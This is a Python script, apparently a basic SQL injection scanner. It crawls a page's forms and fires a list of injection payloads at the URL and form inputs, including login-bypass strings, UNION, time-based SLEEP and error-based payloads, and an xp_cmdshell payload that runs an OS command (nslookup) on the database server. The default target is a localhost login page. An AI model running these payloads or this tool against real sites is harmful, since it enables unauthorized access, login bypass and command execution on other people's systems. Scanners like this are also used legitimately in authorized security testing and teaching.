import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

# List of SQL injection payloads to test
payloads = [
    "'OR 1-- -",
    "",  # Add an empty payload for testing the original request
    "'",
    "\"",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "adm' or '1'='1",
    "' UNION SELECT null --",
    "\" UNION SELECT null --",
    "' OR IF(1=1, SLEEP(5), 0) --",  # Time-based blind SQL injection
    "\" OR IF(1=1, SLEEP(5), 0) --",  # Time-based blind SQL injection
    "' OR 1=1 --",  # Boolean-based blind SQL injection
    "\" OR 1=1 --",  # Boolean-based blind SQL injection
    "'; EXEC xp_cmdshell('nslookup example.com') --",  # Out-of-Band SQL injection
    "' AND 1=CONVERT(int, (SELECT @@version)) --",  # Error-Based SQL injection
    "\" AND 1=CONVERT(int, (SELECT @@version)) --",  # Error-Based SQL injection
    "' OR '1'='1",  # Blind SQL injection for Login Bypass
    "\" OR \"1\"=\"1",  # Blind SQL injection for Login Bypass
]

def get_all_forms(url):
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None

    method = form.attrs.get("method", "get").lower()

    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }

    for error in errors:
        if error in response.content.decode().lower():
            return True

    return False

def scan_sql_injection(url):
    for payload in payloads:
        new_url = f"{url}{payload}"
        print("Trying to find vulnerability on ", new_url)
        res = s.get(new_url)
        if is_vulnerable(res):
            print("SQL Injection vulnerability detected, link:", new_url)

    forms = get_all_forms(url)
    print(f"Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for payload in payloads:
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    try:
                        data[input_tag["name"]] = input_tag["value"] + payload
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{payload}"

            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)

            if is_vulnerable(res):
                print("SQL Injection vulnerability detected, link:", url)
                print("Form:")
                print(form_details)
                break

if __name__ == "__main__":
    url = "http://localhost/login.php"
    scan_sql_injection(url)
